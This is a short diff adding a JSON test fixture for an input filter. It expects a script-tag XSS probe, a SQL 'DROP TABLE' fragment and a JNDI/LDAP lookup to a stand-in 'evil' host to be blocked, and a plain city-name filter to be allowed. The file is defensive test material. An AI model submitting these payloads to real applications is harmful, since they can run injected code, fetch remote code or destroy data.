@@ -1,0 +1,8 @@
+{
+  "tests": [
+    { "input": "<script>alert(1)</script>", "status": "BLOCKED / script tag" },
+    { "input": "DROP TABLE users; --", "status": "BLOCKED / sql-like payload" },
+    { "input": "normal filter: Shanghai", "status": "ALLOWED" },
+    { "input": "${jndi:ldap://evil}", "status": "BLOCKED / injection pattern" }
+  ]
+}
